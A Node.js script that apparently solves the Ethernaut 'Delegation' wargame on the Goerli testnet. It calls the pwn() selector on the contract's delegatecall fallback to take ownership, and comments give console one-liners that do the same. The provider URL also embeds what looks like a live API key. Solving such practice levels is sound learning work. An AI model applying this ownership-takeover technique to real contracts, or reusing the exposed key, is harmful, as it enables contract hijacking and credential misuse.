const { ethers } = require("ethers");
const fs = require("fs-extra");
require("dotenv").config();

async function main() {
  const provider = new ethers.providers.JsonRpcProvider(
    "https://eth-goerli.g.alchemy.com/v2/NW7PWVbJEDvetNwwfXGraE71PLMqeBrw"
  );
  let signer = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  const abi = fs.readFileSync(
    "./Ethernauts_abi_bin/contracts_Delegation_Delegation_sol_Delegation.abi",
    "utf8"
  );

  const delegation = new ethers.Contract(
    "0x58f60F03a855111b1Df15bE3E411f1E53322F125",
    abi,
    signer
  );
  console.log("...");
  console.log(await delegation.owner());

  let ABI = ["function pwn()"];
  let iface = new ethers.utils.Interface(ABI);
  let encoded = iface.encodeFunctionData("pwn", []);
  console.log(encoded);

  const transaction = await signer.sendTransaction({
    to: "0x58f60F03a855111b1Df15bE3E411f1E53322F125",
    data: "0xdd365b8b",
    gasLimit: 12450000,
  });
  //   It works from web console with these:
  // await web3.utils.sha3("pwn()")
  // await contract.sendTransaction({ data: "0xdd365b8b" })
  await transaction.wait(1);
  // console.log(transaction);
  console.log(await delegation.owner());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
